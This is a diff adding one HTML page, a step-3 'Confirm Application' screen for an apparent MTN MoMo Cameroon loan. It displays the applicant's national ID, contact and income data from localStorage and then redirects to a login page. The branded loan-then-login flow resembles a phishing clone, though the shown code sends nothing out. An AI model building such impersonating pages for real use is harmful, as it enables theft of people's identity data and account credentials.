@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan - Confirm</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 8px 18px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+
+        .form-title .highlight {
+            color: #0047AB;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px auto;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            transition: width 0.5s ease;
+        }
+
+        .step-text {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .review-section {
+            background: #f8f9ff;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 14px;
+            border: 1.5px solid #eef1ff;
+        }
+
+        .review-section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .review-section-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #0047AB;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .edit-link {
+            font-size: 12px;
+            font-weight: 700;
+            color: #0047AB;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+        }
+
+        .edit-link:hover {
+            background: #e0e8ff;
+        }
+
+        .review-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 7px 0;
+            font-size: 14px;
+            border-bottom: 1px dashed #e0e0e0;
+            gap: 12px;
+        }
+
+        .review-row:last-child {
+            border-bottom: none;
+        }
+
+        .review-label {
+            color: #777;
+            font-weight: 500;
+            flex-shrink: 0;
+        }
+
+        .review-value {
+            color: #1a1a2e;
+            font-weight: 700;
+            text-align: right;
+            word-break: break-word;
+        }
+
+        .loan-highlight {
+            background: #FFCC00;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .loan-highlight .item {
+            text-align: center;
+            flex: 1;
+        }
+
+        .loan-highlight .label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            color: #1a1a2e;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-bottom: 3px;
+            opacity: 0.75;
+        }
+
+        .loan-highlight .value {
+            display: block;
+            font-size: 15px;
+            font-weight: 800;
+            color: #1a1a2e;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 18px 0 6px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-top: 1px;
+            accent-color: #0047AB;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        .checkbox-group label a {
+            color: #0047AB;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .checkbox-error {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .checkbox-error.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .invalid-checkbox {
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 14px;
+        }
+
+        .back-step-btn {
+            flex: 1;
+            padding: 16px;
+            background: #f0f4ff;
+            color: #0047AB;
+            border: 2px solid #e0e0e0;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .back-step-btn:hover {
+            background: #e0e8ff;
+            border-color: #0047AB;
+        }
+
+        .proceed-btn {
+            flex: 2;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .proceed-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+        }
+
+        .proceed-btn:active {
+            transform: scale(0.98);
+        }
+
+        .proceed-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 20px;
+            }
+            .loan-highlight {
+                padding: 12px 8px;
+            }
+            .loan-highlight .value {
+                font-size: 13px;
+            }
+            .btn-row {
+                flex-direction: column-reverse;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='details.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <div style="width:28px;"></div>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">✅ <span class="highlight">Confirm</span> Application</h1>
+        <p class="form-subtitle">Step 3 of 3</p>
+
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Review and proceed to login</div>
+
+        <!-- LOAN HIGHLIGHT -->
+        <div class="loan-highlight">
+            <div class="item">
+                <span class="label">Amount</span>
+                <span class="value" id="rvAmount">—</span>
+            </div>
+            <div class="item">
+                <span class="label">Term</span>
+                <span class="value" id="rvTerm">—</span>
+            </div>
+            <div class="item">
+                <span class="label">Monthly</span>
+                <span class="value" id="rvMonthly">—</span>
+            </div>
+        </div>
+
+        <!-- LOAN DETAILS -->
+        <div class="review-section">
+            <div class="review-section-header">
+                <span class="review-section-title">Loan Details</span>
+                <button class="edit-link" onclick="window.location.href='application.html'">Edit</button>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Product</span>
+                <span class="review-value" id="rvProduct">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Purpose</span>
+                <span class="review-value" id="rvPurpose">—</span>
+            </div>
+        </div>
+
+        <!-- PERSONAL DETAILS -->
+        <div class="review-section">
+            <div class="review-section-header">
+                <span class="review-section-title">Personal Details</span>
+                <button class="edit-link" onclick="window.location.href='details.html'">Edit</button>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Full Name</span>
+                <span class="review-value" id="rvName">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Date of Birth</span>
+                <span class="review-value" id="rvDob">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Gender</span>
+                <span class="review-value" id="rvGender">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">National ID</span>
+                <span class="review-value" id="rvId">—</span>
+            </div>
+        </div>
+
+        <!-- CONTACT INFO -->
+        <div class="review-section">
+            <div class="review-section-header">
+                <span class="review-section-title">Contact Information</span>
+                <button class="edit-link" onclick="window.location.href='details.html'">Edit</button>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Phone</span>
+                <span class="review-value" id="rvPhone">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Email</span>
+                <span class="review-value" id="rvEmail">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Region</span>
+                <span class="review-value" id="rvRegion">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">City</span>
+                <span class="review-value" id="rvCity">—</span>
+            </div>
+        </div>
+
+        <!-- EMPLOYMENT -->
+        <div class="review-section">
+            <div class="review-section-header">
+                <span class="review-section-title">Employment & Income</span>
+                <button class="edit-link" onclick="window.location.href='details.html'">Edit</button>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Status</span>
+                <span class="review-value" id="rvEmployment">—</span>
+            </div>
+            <div class="review-row">
+                <span class="review-label">Monthly Income</span>
+                <span class="review-value" id="rvIncome">—</span>
+            </div>
+        </div>
+
+        <!-- TERMS -->
+        <div class="checkbox-group" id="termsGroup">
+            <input type="checkbox" id="terms">
+            <label for="terms">
+                I confirm that all the information provided is accurate and I agree to the
+                <a href="#" onclick="alert('Terms & Conditions'); return false;">Terms & Conditions</a> and
+                <a href="#" onclick="alert('Privacy Policy'); return false;">Privacy Policy</a> of MTN MoMo Cameroon.
+            </label>
+        </div>
+        <div class="checkbox-error" id="termsError">You must agree to the Terms & Conditions to proceed</div>
+
+        <div class="btn-row">
+            <button class="back-step-btn" onclick="window.location.href='details.html'">← BACK</button>
+            <button class="proceed-btn" id="proceedBtn">PROCEED →</button>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <script>
+        // ============================================
+        // LOAD ALL SAVED DATA & DISPLAY IN REVIEW
+        // ============================================
+        function formatXAF(val) {
+            if (!val) return '—';
+            return 'XAF ' + parseFloat(val).toLocaleString('en-US');
+        }
+
+        function formatDate(isoString) {
+            if (!isoString) return '—';
+            const parts = isoString.split('-');
+            if (parts.length !== 3) return isoString;
+            return `${parts[2]}/${parts[1]}/${parts[0]}`;
+        }
+
+        const loanType = localStorage.getItem('loanType');
+        const loanAmount = localStorage.getItem('loanAmount');
+        const loanTerm = localStorage.getItem('loanTerm');
+        const loanPurpose = localStorage.getItem('loanPurpose');
+        const loanRepayment = localStorage.getItem('loanRepayment');
+
+        let monthlyDisplay = loanRepayment;
+        if (!monthlyDisplay && loanAmount && loanTerm) {
+            const amt = parseFloat(loanAmount);
+            const months = parseFloat(loanTerm);
+            const rate = 0.10 / 12;
+            const pow = Math.pow(1 + rate, months);
+            const mp = amt * (rate * pow) / (pow - 1);
+            monthlyDisplay = 'XAF ' + mp.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        document.getElementById('rvAmount').textContent = formatXAF(loanAmount);
+        document.getElementById('rvTerm').textContent = loanTerm ? (loanTerm + (loanTerm === '1' ? ' month' : ' months')) : '—';
+        document.getElementById('rvMonthly').textContent = monthlyDisplay || '—';
+        document.getElementById('rvProduct').textContent = loanType || '—';
+        document.getElementById('rvPurpose').textContent = loanPurpose || '—';
+
+        document.getElementById('rvName').textContent = localStorage.getItem('app_fullName') || '—';
+        document.getElementById('rvDob').textContent = formatDate(localStorage.getItem('app_dob'));
+        document.getElementById('rvGender').textContent = (function() {
+            const g = localStorage.getItem('app_gender');
+            return g ? g.charAt(0).toUpperCase() + g.slice(1) : '—';
+        })();
+        document.getElementById('rvId').textContent = localStorage.getItem('app_idNumber') || '—';
+        document.getElementById('rvPhone').textContent = localStorage.getItem('app_phone') || '—';
+        document.getElementById('rvEmail').textContent = localStorage.getItem('app_email') || '—';
+        document.getElementById('rvRegion').textContent = localStorage.getItem('app_region') || '—';
+        document.getElementById('rvCity').textContent = localStorage.getItem('app_city') || '—';
+        document.getElementById('rvEmployment').textContent = localStorage.getItem('app_employment') || '—';
+        document.getElementById('rvIncome').textContent = formatXAF(localStorage.getItem('app_income'));
+
+        // ============================================
+        // TERMS CHECKBOX HANDLER
+        // ============================================
+        const termsCheckbox = document.getElementById('terms');
+        const termsError = document.getElementById('termsError');
+        const termsGroup = document.getElementById('termsGroup');
+
+        termsCheckbox.addEventListener('change', function() {
+            if (this.checked) {
+                termsError.classList.remove('show');
+                termsGroup.classList.remove('invalid-checkbox');
+            }
+        });
+
+        // ============================================
+        // PROCEED HANDLER → Save application & go to login
+        // ============================================
+        const proceedBtn = document.getElementById('proceedBtn');
+
+        proceedBtn.addEventListener('click', function() {
+            // Validate terms checkbox
+            if (!termsCheckbox.checked) {
+                termsError.classList.add('show');
+                termsGroup.classList.add('invalid-checkbox');
+                termsGroup.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return;
+            }
+
+            proceedBtn.disabled = true;
+            proceedBtn.textContent = 'PROCEEDING...';
+
+            // Build final application object
+            const application = {
+                reference: 'MM-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                loan: {
+                    type: loanType,
+                    amount: loanAmount,
+                    term: loanTerm,
+                    purpose: loanPurpose,
+                    monthlyPayment: monthlyDisplay
+                },
+                personal: {
+                    fullName: localStorage.getItem('app_fullName'),
+                    dob: localStorage.getItem('app_dob'),
+                    gender: localStorage.getItem('app_gender'),
+                    idNumber: localStorage.getItem('app_idNumber'),
+                    phone: localStorage.getItem('app_phone'),
+                    email: localStorage.getItem('app_email'),
+                    region: localStorage.getItem('app_region'),
+                    city: localStorage.getItem('app_city'),
+                    employment: localStorage.getItem('app_employment'),
+                    income: localStorage.getItem('app_income')
+                },
+                submittedAt: new Date().toISOString(),
+                status: 'pending_login'
+            };
+
+            console.log('📩 Application prepared for login:', application);
+
+            // In production: POST to your backend here
+            // fetch('/api/applications', { method: 'POST', body: JSON.stringify(application) })
+
+            // Save application locally
+            localStorage.setItem('lastApplication', JSON.stringify(application));
+
+            // Proceed to login page
+            setTimeout(function() {
+                window.location.href = 'login.html';
+            }, 500);
+        });
+
+        console.log('====================================');
+        console.log('💰 MTN MoMo Loan – Cameroon');
+        console.log('✅ Confirm Page Loaded (Step 3/3)');
+        console.log('➡️  Proceed → login.html');
+        console.log('====================================');
+    </script>
+</body>
+</html>
